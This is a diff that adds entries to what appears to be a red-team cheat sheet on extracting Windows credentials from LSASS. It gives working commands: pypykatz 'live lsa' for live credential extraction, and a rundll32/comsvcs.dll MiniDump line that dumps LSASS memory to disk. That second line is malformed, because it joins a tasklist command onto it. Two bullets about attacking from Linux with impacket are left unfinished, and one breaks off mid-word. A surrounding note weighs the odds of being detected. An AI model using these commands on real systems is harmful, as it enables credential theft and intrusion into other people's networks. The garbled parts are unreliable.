@@ -441,8 +441,23 @@ $ rundll32.exe C:\Dumpert\Outflank-Dumpert.dll,Dump
 ```
 
 
+- Using pypykatz (Mimikatz functionality in Python)
+
+```powershell
+$ pypykatz.exe live lsa
+```
 
 
+- Using comsvcs.dll
+
+```powershell
+$ tasklist /FI "IMAGENAME eq lsass.exe" rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump <lsass process ID> C:\Users\Public\lsass.dmp full
+```
+
+
+
+- From a Linux attacking machine using impacket.
+- From a Linux attacking machine using P
 
 > **Note :** Anything that interact with LSASS has higher chances of detection, so before trying to extract credentials from LSASS we can try to lookup other revenues e.g powershell console history, Local SAM hives, Credential Notes etc.
 
